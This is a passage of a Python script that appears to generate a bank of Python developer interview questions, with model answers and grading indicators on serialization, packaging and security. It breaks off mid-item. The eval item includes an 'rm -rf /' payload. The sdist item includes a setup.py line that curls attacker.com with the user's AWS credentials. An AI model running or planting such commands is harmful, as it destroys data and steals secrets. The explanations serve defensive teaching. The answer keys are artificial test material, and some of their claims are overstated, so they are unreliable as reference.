import asyncio
import json
import os
import re
import sys
import uuid
import hashlib
from collections import Counter

from dotenv import load_dotenv
from sklearn.feature_extraction.text import TfidfVectorizer
from sklearn.metrics.pairwise import cosine_similarity

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
load_dotenv()

BACKEND_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATA_DIR = os.path.join(BACKEND_DIR, "data")
OUT = os.path.join(DATA_DIR, "interview_question_bank_v2_generated.jsonl")

ROLE = "Python Developer"
LEAK = re.compile(r"(generate a question|generate \d+ questions|return only json|phase 4f gap plan|"
                  r"generation batch|candidate generation|system instructions|do not proceed|"
                  r"awaiting authorization|minimum target|generation pipeline|"
                  r"batch \d+ generation|expected answer|strong indicator|weak indicator|as an ai|"
                  r"here is the question|\bprompt text\b)", re.I)

# Tuple structure:
# (id_code, intent, difficulty, question_type, [primary_skill, secondary_skills...], technology, topic, question, expected_answer, strong_indicators, weak_indicators)
Q = [
    (
        "B69_4_1",
        "implement",
        "hard",
        "implement",
        ["Serialization", "Performance Tuning"],
        "ijson / JSON Streaming",
        "Streaming Massive JSON Datasets with ijson for Constant Memory",
        "You need to process a 25GB JSON file containing an array of 50 million user records: `[{\"id\": 1, ...}, ...]`. Calling standard `json.load(f)` immediately crashes the Python process with an `OutOfMemoryError` on a server with 16GB of RAM. How do you implement iterative, streaming JSON parsing in Python using `ijson` to parse and process records one-by-one with constant $O(1)$ memory?",
        "Why json.load() Fails: Standard `json.load(f)` is a non-streaming parser that reads the entire 25GB text into memory and builds the complete Python object graph (dictionaries, lists, strings) simultaneously. Because Python objects incur significant memory overhead (~3-4x the raw JSON size), a 25GB JSON file requires ~80-100GB of RAM to instantiate, instantly triggering an OOM crash. Implementation with ijson: 1) Iterative Event-Driven Parsing: `ijson` is an iterative JSON parser wrapping native C backends (YAJL). It parses tokens from an underlying file stream sequentially without loading the full document into RAM. 2) Using `ijson.items()`: `with open('large.json', 'rb') as f: for user in ijson.items(f, 'item'): process_user(user)`. 3) How 'item' Works: The path `'item'` tells ijson to stream through the root array and emit individual dictionary objects one at a time as complete Python dictionaries. 4) Memory Footprint: Each dictionary is yielded to the loop, processed, and immediately garbage-collected on the next loop iteration. The process operates with a strictly constant $O(1)$ memory footprint (typically < 30MB of RAM) regardless of whether the file is 25GB or 1 Terabyte.",
        [
            "Explains that standard json.load() builds the entire Python object tree in memory, multiplying RAM requirements",
            "Implements ijson.items(f, 'item') to stream individual array elements sequentially from disk",
            "Demonstrates constant O(1) memory consumption by allowing individual parsed objects to be garbage-collected immediately"
        ],
        [
            "Suggests splitting the 25GB JSON file manually using regex string splits on commas"
        ]
    ),
    (
        "B69_4_2",
        "explain",
        "medium",
        "explain",
        ["Performance Tuning", "CPython Internals"],
        "memoryview / bytearray",
        "Zero-Copy Binary Buffer Manipulation with memoryview and bytearray",
        "In a high-throughput network proxy written in Python handling gigabytes of binary protocol packets, why does slicing a standard `bytes` object (`packet[10:1000]`) introduce severe CPU and GC memory allocation bottlenecks, and how does `memoryview` enable zero-copy slicing and buffer mutation?",
        "Why Slicing bytes Incurs High Overhead: In Python, `bytes` objects are immutable. Whenever you slice a bytes object (`sub = data[10:1000]`), CPython allocates a *brand new bytes object* on the heap, copies the 990 bytes from the source buffer into the new buffer using `memcpy()`, and registers the new object with reference counting. If a proxy processes 100,000 packets per second, this generates gigabytes of short-lived allocations per second, saturating CPU caches and overwhelming the Python memory allocator. How `memoryview` Enables Zero-Copy: 1) Python Buffer Protocol: A `memoryview` exposes the C-level Python Buffer Protocol (PEP 3118). It wraps an existing memory buffer (like a `bytearray`, `bytes`, or socket buffer) without copying it. 2) Zero-Copy Slicing: Slicing a `memoryview` (`view = memoryview(data); sub_view = view[10:1000]`) creates a new lightweight view object that points directly to the existing memory address with an offset and length pointer. Zero bytes are copied. 3) Direct Socket I/O: Socket methods accept memoryviews directly (`sock.sendall(sub_view)` or `sock.recv_into(view)`), allowing the OS kernel to read and write directly to/from the pre-allocated buffer with absolute zero copy.",
        [
            "Explains that slicing immutable bytes allocates new heap objects and copies memory via memcpy()",
            "Defines memoryview as exposing the C Python Buffer Protocol (PEP 3118) for zero-copy reference slicing",
            "Shows direct socket integration via sock.sendall() and sock.recv_into() eliminating intermediate buffers"
        ],
        [
            "Claims memoryview is a graphical user interface tool for viewing computer RAM"
        ]
    ),
    (
        "B69_4_3",
        "concept",
        "easy",
        "concept",
        ["Language Semantics", "Financial Computing"],
        "Decimal module",
        "Floating-Point Inaccuracy vs decimal.Decimal in Financial Systems",
        "Why is using standard Python `float` arithmetic (`0.1 + 0.2`) dangerous for financial calculations, and how do `decimal.Decimal`, `decimal.Context`, and rounding modes like `ROUND_HALF_EVEN` guarantee exact monetary calculations?",
        "1) Why `float` Fails for Currency: Python's `float` type uses IEEE 754 64-bit binary floating-point representation. Binary cannot precisely represent base-10 fractions (such as 0.1 or 0.01). In Python: `0.1 + 0.2` evaluates to `0.30000000000000004`. Over millions of financial transactions, accumulated floating-point rounding errors lead to balance discrepancies, accounting fraud flags, and regulatory audit failures. 2) How `decimal.Decimal` Solves This: `decimal.Decimal` implements exact base-10 arithmetic modeled after human decimal arithmetic. Decimal instances must be constructed from strings (`Decimal('0.1') + Decimal('0.2') == Decimal('0.3')`) or integers, never raw floats. 3) Context and Rounding Modes: The `decimal.getcontext()` object governs global arithmetic rules: A) Precision: Controls significant digits (`prec = 28`). B) Bankers' Rounding (`ROUND_HALF_EVEN`): The financial standard rounding mode that rounds ties to the nearest even number (e.g., 2.5 rounds to 2, 3.5 rounds to 4). This mathematically neutralizes statistical rounding bias across large transaction ledgers compared to standard round-half-up.",
        [
            "Explains that IEEE 754 binary floating-point cannot precisely represent base-10 decimal fractions (0.1 + 0.2 != 0.3)",
            "Mandates constructing Decimal from strings (Decimal('0.1')) rather than binary floats",
            "Defines Bankers' Rounding (ROUND_HALF_EVEN) and its role in eliminating cumulative rounding bias in ledger accounting"
        ],
        [
            "Claims Python floats are always accurate to 100 decimal places"
        ]
    ),
    (
        "B69_4_4",
        "scenario",
        "hard",
        "scenario",
        ["Serialization", "Architecture"],
        "pickle / copyreg",
        "Cross-Version Pickle Compatibility Failures and Class Refactoring",
        "A distributed caching layer caches pickled Python domain models (`pickle.dumps(user_profile)`) in Redis. The engineering team deploys a major backend refactoring that moves `UserProfile` from `app.models.user` to `app.domain.entities.user`. Immediately after deployment, the application crashes on every cache read with `AttributeError: Can't get attribute 'UserProfile' on <module 'app.models.user'>`. How does pickle encode class metadata, and how do you implement a custom `copyreg` dispatch table or `Unpickler.find_class()` to support backward-compatible unpickling?",
        "Why Pickle Breaks on Code Refactoring: 1) Class Identity by Module Path: When CPython pickles an instance of a class, it does NOT store the class definition or bytecode. It stores an opcode tuple containing: the module name (`'app.models.user'`) and the class name (`'UserProfile'`), followed by the instance's `__dict__`. 2) Unpickling Failure: During unpickling, Python dynamically calls `__import__('app.models.user')` and `getattr(module, 'UserProfile')`. Because the file was moved to `app.domain.entities.user`, the old module attribute lookup fails, raising an `AttributeError`. Backward-Compatible Solutions: 1) Overriding `find_class()` in a Custom Unpickler: Subclass `pickle.Unpickler` and override `find_class(self, module, name)`: `class MigrationUnpickler(pickle.Unpickler): def find_class(self, module, name): if module == 'app.models.user' and name == 'UserProfile': return app.domain.entities.user.UserProfile; return super().find_class(module, name)`. Use `MigrationUnpickler(io.BytesIO(data)).load()`. 2) Custom Serialization with `copyreg`: Use Python's `copyreg.pickle()` to register explicit reduction functions that serialize objects under alias paths. 3) Architectural Fix: Never use raw Python pickle for cross-service, long-lived, or distributed caching layers; migrate to language-agnostic, schema-stable formats (JSON, Protobuf, or MsgPack).",
        [
            "Explains that pickle encodes classes by qualified string name and module path, not by class definition",
            "Identifies module reorganization breaking unpickler attribute lookups (AttributeError)",
            "Subclasses pickle.Unpickler and overrides find_class() to alias and remap legacy module paths to new locations"
        ],
        [
            "Recommends deleting all cached customer data in Redis whenever code is refactored"
        ]
    ),
    (
        "B69_4_5",
        "implement",
        "medium",
        "implement",
        ["Serialization", "Performance Tuning"],
        "msgpack-python",
        "High-Performance Binary Serialization with MessagePack and Custom Types",
        "Your microservices exchange millions of JSON messages per second over Redis. JSON serialization is consuming 35% of total backend CPU, and payloads are bloated by repeated ASCII keys. How do you replace JSON with MessagePack (`msgpack-python`) for compact binary serialization, and how do you handle custom Python types like `datetime.datetime` and `uuid.UUID` using `default` and `ext_hook`?",
        "MessagePack Architecture & Implementation: 1) Why MessagePack is Superior: MessagePack is an efficient binary serialization format that looks like JSON but is drastically faster and smaller. Numbers and strings are encoded with type prefix bytes, eliminating ASCII string parsing and delimiter escaping. Payloads are 30-50% smaller, and serialization speed is 2x-4x faster than standard Python `json`. 2) Handling Custom Types with `default`: MessagePack cannot serialize `datetime` or `UUID` natively out of the box. Use the `default` parameter during packing: `def custom_packer(obj): if isinstance(obj, datetime): return {'__type__': 'datetime', 'val': obj.isoformat()}; if isinstance(obj, uuid.UUID): return {'__type__': 'uuid', 'val': str(obj)}; raise TypeError(f'Unknown type: {type(obj)}')`. `packed = msgpack.packb(data, default=custom_packer)`. 3) Decoding with `object_hook` or `ext_hook`: When unpacking: `def custom_unpacker(obj): if '__type__' in obj: if obj['__type__'] == 'datetime': return datetime.fromisoformat(obj['val']); if obj['__type__'] == 'uuid': return uuid.UUID(obj['val']); return obj`. `unpacked = msgpack.unpackb(packed, object_hook=custom_unpacker)`. (Alternatively, use MessagePack Extension types via `msgpack.ExtType` for zero-overhead integer type tagging).",
        [
            "Explains MessagePack binary encoding benefits: smaller payloads, type prefix bytes, and faster C-extension serialization",
            "Implements custom_packer via default callback to serialize datetime and UUID objects",
            "Implements custom_unpacker via object_hook or ExtType to restore domain types during deserialization"
        ],
        [
            "Claims MessagePack compresses data using standard Gzip compression algorithms"
        ]
    ),
    (
        "B69_4_6",
        "concept",
        "easy",
        "concept",
        ["Data Pipelines", "Performance Tuning"],
        "csv / Generators",
        "Memory-Efficient CSV Streaming with Generators vs Pandas read_csv",
        "A Python data script reads a 10GB CSV file using Pandas: `df = pd.read_csv('massive.csv')`. The script crashes the container due to memory exhaustion. Why does Pandas consume 3x to 5x the raw file size in RAM, and how does using Python's built-in `csv.reader` with a generator pipeline maintain a minimal memory footprint?",
        "1) Why Pandas read_csv() Exhausts Memory: When Pandas loads a 10GB CSV file, it does NOT stream it; it reads the entire file into memory and constructs an in-memory DataFrame. For every column, Pandas performs type inference, allocating 64-bit integer blocks, float blocks, or Python object arrays. String columns in Pandas (pre-Arrow) are stored as Python object pointers pointing to individual boxed string objects, ballooning a 10GB CSV into 30GB to 50GB of RAM. 2) Generator Pipeline with `csv.reader`: Python's built-in `csv.reader` operates as a generator over an open file descriptor: `def stream_csv(path): with open(path, 'r', newline='') as f: reader = csv.DictReader(f); for row in reader: yield row`. The operating system reads the file in 4KB/8KB filesystem blocks. Only *one single row* exists in memory at any given microsecond. Processed rows are discarded immediately, allowing Python to process a 10GB or 100GB CSV file smoothly with less than 20MB of total resident RAM.",
        [
            "Explains that Pandas constructs full in-memory DataFrames with heavy object pointer boxing, multiplying memory usage",
            "Uses built-in csv.DictReader as a streaming generator to process rows one-by-one from the file descriptor",
            "Demonstrates constant low memory consumption (< 20MB) regardless of CSV file size on disk"
        ],
        [
            "Claims CSV files cannot be opened in Python without installing Microsoft Excel"
        ]
    ),
    (
        "B69_4_7",
        "explain",
        "medium",
        "explain",
        ["Data Validation", "Performance Tuning"],
        "Pydantic v2 / pydantic-core",
        "Pydantic v2 Architecture: pydantic-core in Rust and Serialization Speedups",
        "Pydantic v2 achieved a 5x to 50x performance increase over Pydantic v1 for data parsing and validation. What architectural shift did Pydantic execute (moving from Python bytecode validation to `pydantic-core` in Rust), and how does it optimize schema compilation and serialization?",
        "Architectural Shift in Pydantic v2: 1) Elimination of Python Bytecode Validation: In Pydantic v1, model validation was executed entirely in pure Python bytecode. Every field validation, type check, validator function, and error construction traversed Python's interpreter loop and dynamic type system, incurring massive function call overhead. 2) The `pydantic-core` Rust Engine: In Pydantic v2, all core validation and serialization logic was rewritten in Rust (`pydantic-core`). When a Pydantic model is defined, Python builds a declarative JSON Schema/AST of the model *once at class definition time* and compiles it into a high-speed Rust validator graph. 3) Native Traversal & Zero-Copy: When JSON or dictionary data is passed to `Model.model_validate()`, the data is passed directly into the compiled Rust engine. Rust traverses the data structures, executes type coercion, validates constraints, and checks regexes in compiled machine code with zero Python interpreter overhead. 4) Direct JSON Parsing: Pydantic v2 can parse raw JSON strings directly in Rust (`model_validate_json()`), completely bypassing Python's `json.loads()` dictionary allocation and constructing validated models in a single compiled pass.",
        [
            "Explains moving validation logic from pure Python bytecode to compiled Rust machine code (pydantic-core)",
            "Describes compiling model definitions into declarative validation graphs at class definition time",
            "Highlights direct JSON parsing via model_validate_json() bypassing intermediate Python dictionary allocation"
        ],
        [
            "Claims Pydantic v2 is faster because it deletes all type annotations from your code"
        ]
    ),
    (
        "B69_4_8",
        "tradeoff",
        "medium",
        "tradeoff",
        ["Serialization", "Performance Tuning"],
        "orjson / ujson",
        "High-Performance JSON Serializers: orjson vs Standard library json",
        "In high-throughput Python web APIs, replacing the standard library `json` module with `orjson` often yields a 3x-6x throughput increase. What architectural optimizations allow `orjson` to outperform `json.dumps()`, and what are the tradeoffs regarding return types and custom object serialization?",
        "How orjson Achieves Superior Performance: 1) Rust Implementation and SIMD: `orjson` is implemented in Rust using SIMD (Single Instruction, Multiple Data) CPU hardware instructions for string escaping, number parsing, and UTF-8 validation. 2) Native Datatype Support: Unlike standard `json.dumps()` which crashes on `datetime`, `UUID`, or `dataclasses` without custom encoders, `orjson` natively serializes RFC 3339 datetimes, UUIDs, dataclasses, and NumPy arrays directly in compiled code. 3) Direct UTF-8 Bytes Output: Standard `json.dumps()` serializes data to a Python `str` (requiring UTF-8 decoding and allocating a `PyUnicodeObject`), which web servers then re-encode back to `bytes` before sending over a socket. `orjson.dumps()` produces `bytes` directly, eliminating intermediate string object allocation. Tradeoffs: 1) Returns `bytes`, Not `str`: Code expecting a string (`isinstance(result, str)`) breaks unless decoded. 2) Strict Input Constraints: `orjson` strictly rejects dictionary keys that are not strings or integers, and requires custom types to implement an explicit `default` callable returning supported primitives. 3) Native Dependency: Requires pre-compiled binary wheels; cannot be used in restricted environments where C/Rust extensions are prohibited.",
        [
            "Identifies Rust and SIMD hardware acceleration for string escaping and UTF-8 validation",
            "Highlights direct native serialization of datetimes, UUIDs, dataclasses, and direct UTF-8 bytes output",
            "Evaluates tradeoffs: returns bytes instead of str, strict key constraints, and binary wheel requirements"
        ],
        [
            "Claims orjson is slower than standard json because it runs on older versions of Python"
        ]
    ),
    (
        "B69_4_9",
        "concept",
        "easy",
        "concept",
        ["Security", "Language Semantics"],
        "ast.literal_eval vs eval",
        "Safe Expression Parsing: ast.literal_eval() vs eval()",
        "Why is using `eval()` to parse user-supplied configuration strings or serialized Python literals a critical Remote Code Execution (RCE) vulnerability, and how does `ast.literal_eval()` safely evaluate strings without security risks?",
        "1) The Lethal Danger of `eval()`: `eval(user_input)` invokes the complete CPython compiler and bytecode evaluation engine on the supplied string. An attacker can pass arbitrary Python expressions: `eval(\"__import__('os').system('rm -rf /')\")`. Even if developers attempt string filtering, attackers bypass filters using introspection attributes (`().__class__.__base__.__subclasses__()`), achieving full Remote Code Execution (RCE) and complete server compromise. 2) How `ast.literal_eval()` Guarantees Safety: `ast.literal_eval(s)` does NOT execute code or compile bytecodes. Instead: A) It parses the string into an Abstract Syntax Tree (AST) using Python's standard grammar. B) It inspects the AST nodes against a strict whitelist of safe Python literal types: strings, numbers, tuples, lists, dicts, booleans, sets, and `None`. C) If the AST contains ANY node representing a function call (`Call`), attribute access (`Attribute`), import statement, or operator, `ast.literal_eval()` immediately raises a `ValueError: malformed node or string` without executing any instructions, completely neutralizing code execution attacks.",
        [
            "Explains that eval() compiles and executes arbitrary Python code, enabling complete Remote Code Execution",
            "Details how ast.literal_eval() inspects the AST against a strict whitelist of literal nodes without code execution",
            "Highlights that any non-literal node (function calls, imports, attributes) immediately raises ValueError"
        ],
        [
            "Claims ast.literal_eval() encrypts strings using SSL before running them with eval()"
        ]
    ),
    (
        "B69_4_10",
        "explain",
        "hard",
        "explain",
        ["Data Pipelines", "Performance Tuning"],
        "Apache Arrow / PyArrow",
        "Zero-Copy Tabular Data Sharing with Apache Arrow Plasma and PyArrow",
        "When transferring massive tabular datasets (e.g., 5 million rows with 50 columns) between separate Python worker processes in a data analytics pipeline, why does pickling DataFrames or serializing to CSV/JSON consume massive CPU and RAM, and how does Apache Arrow's columnar format enable zero-copy inter-process communication?",
        "Why Traditional IPC Serialization Fails for Tabular Data: 1) Row-Oriented and Object Overhead: Pickling a DataFrame or converting to JSON requires traversing millions of Python objects, serializing schemas, and copying gigabytes across IPC pipes. Both parent and child processes must allocate full memory copies, doubling RAM usage and spending seconds on serialization/deserialization CPU cycles. Apache Arrow Columnar Architecture: 1) Standardized Columnar Memory Layout: Apache Arrow defines an open, cross-language, in-memory columnar data format. Data is organized contiguously in memory by columns rather than rows, matching modern CPU vectorization (SIMD) and cache lines. 2) Zero-Copy IPC via Shared Memory: PyArrow can write an Arrow RecordBatch directly into shared memory (POSIX shared memory or Arrow Plasma Store). Because the in-memory representation on disk/shared memory is *identical* to its in-memory processing representation, child processes map the shared memory buffer directly into their address space via the Arrow C Data Interface. 3) Result: The receiving Python process accesses the 5-million-row dataset instantly ($O(1)$ time) with zero deserialization overhead, zero memory copying, and zero CPU conversion cycles.",
        [
            "Explains that pickling or JSON serialization incurs massive CPU serialization overhead and duplicates memory",
            "Defines Apache Arrow as a contiguous columnar in-memory format matching CPU cache and SIMD layouts",
            "Demonstrates zero-copy IPC: memory-mapping shared Arrow buffers directly into worker address spaces with O(1) startup"
        ],
        [
            "Claims Apache Arrow requires converting all Python data into Microsoft PowerPoint slides"
        ]
    ),
    (
        "B69_4_11",
        "diagnose",
        "hard",
        "debugging",
        ["Packaging", "Deployment"],
        "Wheels / manylinux / glibc",
        "Wheel ABI Tags and manylinux glibc Compatibility Mismatches",
        "A developer builds a Python wheel containing a C extension on an Ubuntu 22.04 machine: `mypackage-1.0-cp311-cp311-linux_x86_64.whl`. When deploying this wheel to a production Docker container running Debian 11 or Alpine Linux, the container crashes on import with: `ImportError: /lib/x86_64-linux-gnu/libc.so.6: version 'GLIBC_2.34' not found` (or `Error loading shared library ld-linux-x86-64.so.2`). Why did this binary incompatibility occur, and how do PEP 599/600 `manylinux` standards and `auditwheel` resolve it?",
        "Root Cause: Native Binary Linkage and glibc Compatibility: 1) The glibc Versioning Trap: When a C extension is compiled on Ubuntu 22.04, GCC links the binary against the host's GNU C Library (`glibc`), which is version 2.34. The resulting shared library (`.so`) records symbol dependencies requiring `GLIBC_2.34` or higher. 2) Deployment to Older Linux: Debian 11 ships with `glibc 2.31`. When Python attempts `dlopen()` on the extension, the older dynamic linker fails because the required glibc symbols are missing. 3) The Alpine Linux (musl) Problem: Alpine Linux uses `musl libc` instead of `glibc`. A `linux_x86_64` wheel linked against glibc cannot execute on Alpine at all (requires `musllinux` wheels). The Solution: `manylinux` Standards and `auditwheel`: 1) Build inside manylinux Containers: Build wheels inside standardized Docker containers (e.g., `manylinux_2_28` or legacy `manylinux2014`) based on older distributions with low baseline glibc versions. Because glibc is forward-compatible, binaries compiled against older glibc run seamlessly on newer distributions. 2) `auditwheel repair`: Run `auditwheel repair my_wheel.whl`. `auditwheel` inspects external `.so` dependencies, bundles shared libraries into the wheel, patches ELF rpaths via `patchelf`, and tags the wheel with a compliant tag (e.g., `manylinux_2_28_x86_64`), ensuring universal Linux installation.",
        [
            "Diagnoses glibc version mismatch: compiling on newer glibc (2.34) embeds symbols missing on older target distros (glibc 2.31)",
            "Identifies Alpine Linux using musl libc, rendering glibc-linked binaries fundamentally incompatible (requires musllinux)",
            "Prescribes compiling inside manylinux containers and using auditwheel to bundle shared libraries and set valid ABI tags"
        ],
        [
            "Claims glibc errors are resolved by running pip install glibc inside the container"
        ]
    ),
    (
        "B69_4_12",
        "explain",
        "medium",
        "explain",
        ["Packaging", "CPython Internals"],
        "Stable ABI / abi3",
        "Python Stable ABI (abi3) Wheels across CPython Minor Versions",
        "Why do standard C-extension wheels compiled for Python 3.8 (`cp38-cp38`) fail to install or run on Python 3.11 (`cp311`), and how does Python's Limited API (`Py_LIMITED_API`) allow `abi3` wheels to run seamlessly across all Python 3.8+ versions without recompilation?",
        "The Python C-API ABI Problem: In standard CPython, internal C structures (such as `PyTypeObject`, `PyTupleObject`, and macro definitions) change between minor Python versions (e.g., between 3.8 and 3.11). A standard C-extension accesses struct fields directly in memory. If a wheel compiled for 3.8 were loaded into 3.11, struct field offsets would not match, causing immediate memory corruption and segmentation faults. Therefore, pip strictly forbids installing a `cp38` wheel on a `cp311` interpreter. How the Stable ABI (`abi3`) Works: 1) The Limited API: When compiling a C extension with `#define Py_LIMITED_API 0x03080000`, the C compiler is restricted from accessing internal struct fields directly. 2) Opaque Pointers and Stable Function Calls: All interactions must go through stable, opaque function pointers guaranteed by Python core developers to remain binary-compatible forever across minor versions. 3) The `abi3` Wheel Tag: The resulting wheel is tagged with `cp38-abi3-manylinux...`. Because it adheres to the stable ABI, that single wheel can be installed and executed on Python 3.8, 3.9, 3.10, 3.11, 3.12, and 3.13 without recompiling, drastically simplifying package distribution.",
        [
            "Explains that standard C-extension ABI breaks across minor versions due to internal struct layout changes",
            "Defines the Limited API (Py_LIMITED_API) which restricts code to stable, opaque C-API function calls",
            "Demonstrates that an abi3 wheel compiled on 3.8 executes natively on 3.8 through 3.13+ without recompilation"
        ],
        [
            "Claims abi3 wheels are written in pure JavaScript"
        ]
    ),
    (
        "B69_4_13",
        "diagnose",
        "medium",
        "debugging",
        ["Packaging", "Imports"],
        "PEP 420 / Namespace Packages",
        "PEP 420 Implicit Namespace Packages vs Legacy pkgutil Packages",
        "In a microservice monorepo, Team A maintains `company/auth` and Team B maintains `company/billing`. Both packages are installed as separate wheels. In production, importing `company.auth` succeeds, but `company.billing` raises `ModuleNotFoundError: No module named 'company.billing'`. You inspect the site-packages directory and discover that Team A included an `__init__.py` inside their top-level `company/` directory. How did that `__init__.py` file break Team B's package, and how do PEP 420 implicit namespace packages prevent this?",
        "Root Cause: Regular Package Preemption over Namespace Packages: 1) PEP 420 Namespace Packages: PEP 420 introduced 'Implicit Namespace Packages' in Python 3.3+. If a directory named `company/` does NOT contain an `__init__.py`, Python treats it as a namespace package. Its `__path__` attribute is a multi-directory search path. Python dynamically scans ALL directories on `sys.path` to find submodules, seamlessly merging `company/auth` and `company/billing` even if installed in different site-packages folders. 2) The Breaking `__init__.py`: If Team A places a physical `__init__.py` inside their `company/` directory, CPython treats `company` as a *Regular Package*. 3) Search Termination: Once CPython encounters an `__init__.py`, it binds `company.__path__` *strictly to that single specific directory*. It stops searching the rest of `sys.path`! Because Team A's `company/` directory only contains `auth`, any attempt to import `company.billing` fails with `ModuleNotFoundError`. Fix: Delete the top-level `__init__.py` from `company/` across all repositories, allowing both packages to operate as clean PEP 420 implicit namespace packages.",
        [
            "Explains that PEP 420 implicit namespace packages omit __init__.py to allow merging directories across sys.path",
            "Identifies that including an __init__.py converts a namespace into a regular package, restricting __path__ to one directory",
            "Resolves ModuleNotFoundError by removing top-level __init__.py files across all participating monorepo packages"
        ],
        [
            "Claims namespace packages require all Python files to be renamed to .txt"
        ]
    ),
    (
        "B69_4_14",
        "scenario",
        "medium",
        "scenario",
        ["Packaging", "Dependency Management"],
        "pip / Resolver Backtracking",
        "Pip Dependency Resolver Exponential Backtracking and Resolution Stalls",
        "During a CI/CD build, a `pip install -r requirements.txt` command hangs for 45 minutes, printing thousands of lines: `INFO: pip is looking at multiple versions of package-x to determine which version is compatible with other requirements...`. What causes pip's backtracking resolver to enter exponential resolution loops, and how do lockfiles (`pip-tools` / Poetry) prevent it?",
        "Root Cause: Pip's SAT-Style Backtracking Resolver: 1) How the Resolver Works: In pip 20.3+, pip uses a backtracking dependency resolver to guarantee consistent dependency trees. If Package A requires `foo >= 2.0` and Package B requires `foo < 2.0`, pip detects the conflict. 2) Exponential Backtracking: Instead of failing immediately, pip backtracks: it downloads previous releases of Package A, inspects their metadata, checks if that older release has different constraints, downloads older releases of Package B, and so on. If unpinned packages have hundreds of historical releases and conflicting transitive dependencies across 10 packages, the combinatorial search space explodes exponentially ($O(V^N)$). Pip downloads and inspects hundreds of wheel metadata files over the network, hanging CI for hours. Solution: 1) Deterministic Lockfiles: Never run unconstrained `pip install` with loose ranges in CI. Use dependency locking tools (`pip-compile` from `pip-tools`, or Poetry/uv). 2) Lockfile Pinning: A lockfile pins every direct and transitive dependency to an exact, verified version (`foo==2.1.0`), eliminating resolver search spaces completely. 3) Modern Resolvers: Use modern Rust-based package managers like `uv`, which resolve dependencies in milliseconds using pre-indexed crates and aggressive caching.",
        [
            "Explains that pip's backtracking resolver explores historical package versions upon encountering transitive conflicts",
            "Identifies combinatorial explosion (O(V^N)) across unpinned dependencies causing network and resolution stalls",
            "Prescribes deterministic lockfiles (pip-tools, Poetry, uv) pinning exact versions to eliminate backtracking"
        ],
        [
            "Claims pip hangs because the developer's keyboard is disconnected"
        ]
    ),
    (
        "B69_4_15",
        "tradeoff",
        "medium",
        "tradeoff",
        ["Packaging", "Build Systems"],
        "PEP 517 / PEP 518 / Build Isolation",
        "PEP 517/518 Build Isolation: Operational Tradeoffs in Air-Gapped CI/CD",
        "When installing a Python source distribution (`sdist`), `pip` defaults to enabling 'Build Isolation' (PEP 517/518). How does build isolation protect local development environments, and why does it cause sudden build failures in air-gapped, offline CI/CD pipelines unless `--no-build-isolation` is specified?",
        "How Build Isolation Operates (PEP 517 / 518): 1) Isolated Build Virtualenv: When building an `sdist`, `pip` reads the `[build-system]` table in `pyproject.toml` (e.g., `requires = ['setuptools>=61.0', 'wheel', 'cython']`). To prevent conflicting with packages installed in the user's active virtual environment, pip dynamically spins up a temporary, isolated virtual environment in a temporary folder. 2) Ephemeral Dependency Download: Pip connects to PyPI, downloads the declared build dependencies into the temporary virtualenv, builds the wheel, and destroys the temporary environment. Why It Fails in Air-Gapped / Offline CI/CD: In secure, air-gapped enterprise environments with zero outbound internet access, pip attempts to contact PyPI to download the temporary build dependencies. The connection times out, crashing the build even if the required build tools (`setuptools`, `cython`) are *already installed* in the active CI virtual environment! Resolution: In offline CI/CD, pass `--no-build-isolation`. This forces pip to use the build dependencies already present in the current active environment, bypassing the temporary network download requirement.",
        [
            "Explains that PEP 517/518 build isolation spins up a temporary virtualenv and downloads declared build tools from PyPI",
            "Identifies that air-gapped offline environments fail because pip cannot reach PyPI for ephemeral build tools",
            "Prescribes using --no-build-isolation to build packages using pre-installed tools in the active environment"
        ],
        [
            "Claims build isolation is a feature that turns off computer cooling fans during compilation"
        ]
    ),
    (
        "B69_4_16",
        "scenario",
        "hard",
        "scenario",
        ["Security", "Packaging"],
        "pip / sdist vs wheel",
        "Malicious setup.py Code Execution during sdist Installation",
        "A developer runs `pip install untrusted-package` in a terminal. Even though the developer never imported or executed any code from `untrusted-package`, their local SSH keys and AWS credentials are stolen 5 seconds later. How did installing a package execute arbitrary code on the developer's machine without being imported, and how do modern wheels and `--only-binary` mitigate this supply chain attack?",
        "Mechanism of the Attack (Source Distributions - sdist): 1) What an sdist Is: A Source Distribution (`.tar.gz` or `.zip`) contains raw source code and a `setup.py` build script. 2) Arbitrary Execution on Installation: When pip installs an `sdist`, it must build it into a wheel. To do this, pip executes `python setup.py bdist_wheel` (or legacy `install`). The code inside `setup.py` executes with the *full permissions of the user running pip*! A malicious actor can write arbitrary Python code directly in `setup.py` (e.g., `import os, urllib.request; os.system('curl attacker.com?keys=' + open('~/.aws/credentials').read())`). The malware executes before installation even finishes. How Wheels and Safeguards Mitigate This: 1) Wheels are Static Binary Archives: A wheel (`.whl`) is a standard ZIP archive containing pre-built files and metadata. Installing a wheel merely unpacks files into `site-packages`; it executes ZERO Python code at install time. 2) Enforcing Binary-Only Installation: In CI/CD and secure environments, configure pip to strictly reject source distributions: `pip install --only-binary :all: package-name`. If a wheel is not available, pip refuses to install, preventing arbitrary `setup.py` execution. 3) Modern Build Backends: Modern packaging (Flit, Hatch, Poetry) replaces executable `setup.py` with static declarative configuration (`pyproject.toml`).",
        [
            "Explains that sdist installation executes setup.py with full user permissions, enabling arbitrary code execution",
            "Identifies wheels as static ZIP archives that unpack files without running executable build scripts",
            "Enforces pip install --only-binary :all: to reject source distributions and block setup.py attack vectors"
        ],
        [
            "Claims pip install is physically incapable of running code without sudo"
        ]
    ),
    (
        "B69_4_17",
        "concept",
        "easy",
        "concept",
        ["Security", "CI/CD"],
        "pip / Hash Verification",
        "Cryptographic Hash Verification in requirements.txt with --require-hashes",
        "Why is pinning exact package versions (e.g., `requests==2.31.0`) in `requirements.txt` insufficient to protect a production deployment against compromised PyPI packages or Man-In-The-Middle (MITM) repository attacks, and how does `--require-hashes` provide cryptographic integrity?",
